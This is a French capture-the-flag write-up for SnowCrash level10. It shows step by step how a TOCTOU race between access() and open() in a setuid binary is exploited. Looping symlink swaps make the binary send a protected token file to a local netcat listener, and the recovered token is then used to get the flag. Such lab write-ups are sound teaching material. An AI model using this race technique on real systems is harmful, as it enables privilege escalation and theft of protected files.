Avec la commande **ls**, on trouve un fichier binaire **level10** et un fichier **token**.

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

On remarque que le binaire `level10` prends en parametre un fichier et un host:
```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

En decompilant on observe un access sur le fichier, on essaye de faire comme le level précedent :
```bash
level10@SnowCrash:~$ ln -sf ~/token /tmp/link
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
You don't have access to /tmp/link
```

Pour passer la condition du access on peut simplement lui donner un fichier qui a les permissions:
```bash
level10@SnowCrash:~$ echo hello > /tmp/test
level10@SnowCrash:~$ nc -l 6969 & ./level10 /tmp/test 0.0.0.0
[2] 3767
Connecting to 0.0.0.0:6969 .. .*( )*.
Connected!
Sending file .. hello
wrote file!
[1]-  Done                    nc -l 696
```

Du coup, on peut donc exploiter le temps entre la ligne access et la ligne open en changeant de link comme :
```bash
while true ; do ln -sf ~/token /tmp/link; ln -sf /tmp/t /tmp/link; done
```

Puis on fini par boucler egalement sur le `./level10`:
```bash
while true; do nc -l 6969 & ./level10 /tmp/link 0.0.0.0; done
```

On aura éventuellement le flag qui apparaîtra.


Puis on récupère le flag via l'utilisateur **flag10**.

```bash
su -c getflag - flag10
```
